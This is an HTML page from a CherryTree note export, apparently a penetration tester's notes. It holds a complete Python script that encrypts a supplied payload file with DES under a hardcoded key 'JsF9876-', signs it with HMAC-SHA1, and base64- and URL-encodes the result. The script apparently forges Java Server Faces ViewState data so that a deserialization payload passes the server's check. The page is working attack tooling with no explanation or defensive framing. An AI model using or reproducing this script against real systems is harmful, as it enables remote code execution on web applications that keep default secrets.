<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>java_crypt_payload.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">java_crypt_payload.py</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python3</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;hmac<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;urllib&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;parse<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;base64&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;b64encode<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;hashlib&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;sha1<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;pyDes&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br /><br />YELLOW&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\033[93m"</span><br />GREEN&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\033[32m"</span><br /><br />def&nbsp;encrypt(payload,key):<br />&nbsp;&nbsp;&nbsp;&nbsp;cipher&nbsp;=&nbsp;des(key,&nbsp;ECB,&nbsp;IV=<span style="color:#ff0044;font-weight:700">None</span>,&nbsp;pad=<span style="color:#ff0044;font-weight:700">None</span>,&nbsp;padmode=PAD_PKCS5)<br />&nbsp;&nbsp;&nbsp;&nbsp;enc_payload&nbsp;=&nbsp;cipher.encrypt(payload)<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;enc_payload<br /><br />def&nbsp;hmac_sig(enc_payload,key):<br />&nbsp;&nbsp;&nbsp;&nbsp;hmac_sig&nbsp;=&nbsp;hmac.new(key,&nbsp;enc_payload,&nbsp;sha1)<br />&nbsp;&nbsp;&nbsp;&nbsp;hmac_sig&nbsp;=&nbsp;hmac_sig.digest()<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;hmac_sig<br /><br />key&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">b'JsF9876-'</span><br /><br />if&nbsp;len(sys.argv)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;:<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Usage&nbsp;:&nbsp;{}&nbsp;[Payload&nbsp;File]&nbsp;[Output&nbsp;File]"</span>.format(sys.argv[<span style="color:#ff0044;font-weight:400">0</span>]))<br />else:<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"rb"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;f.read()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Encrypting&nbsp;payload"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[!]&nbsp;Key&nbsp;:&nbsp;"</span>&nbsp;+&nbsp;key.decode()&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\n"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;enc_payload&nbsp;=&nbsp;encrypt(payload,key)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Creating&nbsp;HMAC&nbsp;signature"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;hmac_sig&nbsp;=&nbsp;hmac_sig(enc_payload,key)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Appending&nbsp;signature&nbsp;to&nbsp;the&nbsp;encrypted&nbsp;payload\n"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;b64encode(enc_payload&nbsp;+&nbsp;hmac_sig)<br />&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;parse.quote_plus(payload)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(YELLOW&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Final&nbsp;payload&nbsp;:&nbsp;{}\n"</span>.format(payload))<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(sys.argv[<span style="color:#ff0044;font-weight:400">2</span>],&nbsp;<span style="color:#3ad900;font-weight:400">"w"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(payload)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(GREEN&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Saved&nbsp;to&nbsp;:&nbsp;{}"</span>.format(sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]))<br /></div></div></div></body></html>